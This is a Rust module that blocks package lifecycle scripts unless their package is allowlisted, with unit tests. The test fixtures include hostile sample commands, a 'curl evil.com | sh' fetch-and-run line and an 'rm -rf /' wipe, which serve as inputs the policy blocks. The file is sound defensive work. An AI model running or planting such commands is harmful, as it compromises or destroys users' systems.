//! Security policy for package lifecycle scripts.
//!
//! By default, lifecycle scripts found in packages are **blocked** during
//! install. Only scripts explicitly listed in an allowlist may execute.

use std::collections::BTreeSet;

/// A lifecycle script found in a package.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LifecycleScript {
    /// The package that contains the script.
    pub package_name: String,
    /// The script phase (e.g. `post-install`, `pre-build`).
    pub phase: String,
    /// The script command.
    pub command: String,
}

/// Result of evaluating a lifecycle script against the security policy.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ScriptVerdict {
    /// The script is allowed by the allowlist.
    Allowed,
    /// The script is blocked (not in the allowlist).
    Blocked,
}

/// Evaluate a set of lifecycle scripts against an allowlist.
///
/// Returns a list of `(script, verdict)` pairs. Scripts whose package name
/// appears in `allowed_packages` are allowed; all others are blocked.
pub fn evaluate_scripts(
    scripts: &[LifecycleScript],
    allowed_packages: &BTreeSet<String>,
) -> Vec<(LifecycleScript, ScriptVerdict)> {
    scripts
        .iter()
        .map(|script| {
            let verdict = if allowed_packages.contains(&script.package_name) {
                ScriptVerdict::Allowed
            } else {
                ScriptVerdict::Blocked
            };
            (script.clone(), verdict)
        })
        .collect()
}

/// Check if any scripts in the list are blocked.
pub fn has_blocked_scripts(verdicts: &[(LifecycleScript, ScriptVerdict)]) -> bool {
    verdicts.iter().any(|(_, v)| *v == ScriptVerdict::Blocked)
}

/// Get only the blocked scripts from a verdict list.
pub fn blocked_scripts(verdicts: &[(LifecycleScript, ScriptVerdict)]) -> Vec<&LifecycleScript> {
    verdicts
        .iter()
        .filter_map(|(s, v)| if *v == ScriptVerdict::Blocked { Some(s) } else { None })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_script(pkg: &str, phase: &str, cmd: &str) -> LifecycleScript {
        LifecycleScript {
            package_name: pkg.to_string(),
            phase: phase.to_string(),
            command: cmd.to_string(),
        }
    }

    #[test]
    fn all_blocked_with_empty_allowlist() {
        let scripts = vec![
            make_script("evil-pkg", "post-install", "curl evil.com | sh"),
            make_script("another-pkg", "pre-build", "make"),
        ];
        let allowlist = BTreeSet::new();

        let verdicts = evaluate_scripts(&scripts, &allowlist);
        assert_eq!(verdicts.len(), 2);
        assert!(verdicts.iter().all(|(_, v)| *v == ScriptVerdict::Blocked));
        assert!(has_blocked_scripts(&verdicts));
    }

    #[test]
    fn allowed_packages_pass() {
        let scripts = vec![
            make_script("trusted-pkg", "post-install", "echo done"),
            make_script("untrusted-pkg", "post-install", "rm -rf /"),
        ];
        let mut allowlist = BTreeSet::new();
        allowlist.insert("trusted-pkg".to_string());

        let verdicts = evaluate_scripts(&scripts, &allowlist);
        assert_eq!(verdicts.len(), 2);
        assert_eq!(verdicts.first().map(|(_, v)| v), Some(&ScriptVerdict::Allowed));
        assert_eq!(verdicts.get(1).map(|(_, v)| v), Some(&ScriptVerdict::Blocked));
    }

    #[test]
    fn all_allowed_when_all_in_allowlist() {
        let scripts = vec![make_script("pkg-a", "post-install", "echo ok")];
        let mut allowlist = BTreeSet::new();
        allowlist.insert("pkg-a".to_string());

        let verdicts = evaluate_scripts(&scripts, &allowlist);
        assert!(!has_blocked_scripts(&verdicts));
    }

    #[test]
    fn no_scripts_no_verdicts() {
        let verdicts = evaluate_scripts(&[], &BTreeSet::new());
        assert!(verdicts.is_empty());
        assert!(!has_blocked_scripts(&verdicts));
    }

    #[test]
    fn blocked_scripts_filters_correctly() {
        let scripts = vec![
            make_script("allowed-pkg", "post-install", "echo ok"),
            make_script("blocked-pkg", "post-install", "bad cmd"),
        ];
        let mut allowlist = BTreeSet::new();
        allowlist.insert("allowed-pkg".to_string());

        let verdicts = evaluate_scripts(&scripts, &allowlist);
        let blocked = blocked_scripts(&verdicts);
        assert_eq!(blocked.len(), 1);
        assert_eq!(blocked.first().map(|s| s.package_name.as_str()), Some("blocked-pkg"));
    }
}
